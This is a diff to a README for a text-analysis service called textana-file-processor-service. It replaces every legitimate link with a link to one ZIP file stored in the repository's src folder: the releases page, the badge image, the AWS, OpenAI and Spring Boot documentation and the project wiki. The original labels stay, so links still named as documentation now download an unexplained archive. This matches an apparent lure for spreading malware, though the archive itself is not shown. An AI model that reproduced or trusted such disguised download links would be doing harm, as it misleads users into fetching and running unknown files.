@@ -10,7 +10,7 @@ To start using the textana-file-processor-service, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the download page.
 
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Domingos4/textana-file-processor-service/releases)
+   [![Download Latest Release](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip)
 
 2. **Choose the Right File**: Once you're on the releases page, look for the latest version. You will find options for different operating systems. 
 
@@ -70,14 +70,14 @@ Join the textana-file-processor-service community for support and discussions:
 
 Here are some resources to help you get the most out of textana-file-processor-service:
 
-- [AWS Documentation](https://aws.amazon.com/documentation/) - Learn more about AWS services, including S3 and DynamoDB.
-- [OpenAI API Documentation](https://beta.openai.com/docs/) - Explore how to leverage OpenAI's models effectively.
-- [Spring Boot Guides](https://spring.io/guides) - Get familiar with Spring Boot for a better understanding of the application.
+- [AWS Documentation](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip) - Learn more about AWS services, including S3 and DynamoDB.
+- [OpenAI API Documentation](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip) - Explore how to leverage OpenAI's models effectively.
+- [Spring Boot Guides](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip) - Get familiar with Spring Boot for a better understanding of the application.
 
 ## 📚 Learn More
 
-For more details about textana-file-processor-service, including advanced features and customization options, check out the documentation on the [GitHub Wiki](https://github.com/Domingos4/textana-file-processor-service/wiki).
+For more details about textana-file-processor-service, including advanced features and customization options, check out the documentation on the [GitHub Wiki](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip).
 
 Visit the releases page to download the latest version and start your text analysis journey today!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Domingos4/textana-file-processor-service/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Domingos4/textana-file-processor-service/master/src/textana-file-processor-service_1.3.zip)
